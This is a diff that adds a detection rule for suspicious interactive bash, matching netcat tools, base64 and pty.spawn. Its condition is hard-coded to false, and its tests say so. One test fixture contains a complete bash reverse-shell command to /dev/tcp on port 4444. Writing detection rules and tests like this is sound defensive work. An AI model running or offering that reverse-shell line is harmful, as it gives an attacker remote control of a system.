@@ -1,0 +1,16 @@
+name: sigma_susp_interactive_bash
+mode: alert
+eval: |
+  (
+    (false /* ParentCommandLine not available in Rhai API */) && (((e.process_args.contains("-c import ") || e.process_args.contains("base64") || e.process_args.contains("pty.spawn"))) || ((e.process_name.ends_with("whoami") || e.process_name.ends_with("iptables") || e.process_name == "ncat" || e.process_name == "nc" || e.process_name == "netcat")))
+  )
+
+tests:
+  - cleartext: "bash with /dev/tcp - will never match due to false in eval"
+    process_name: bash
+    process_args: "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
+    should_match: false
+  - cleartext: "normal bash"
+    process_name: bash
+    process_args: "bash script.sh"
+    should_match: false
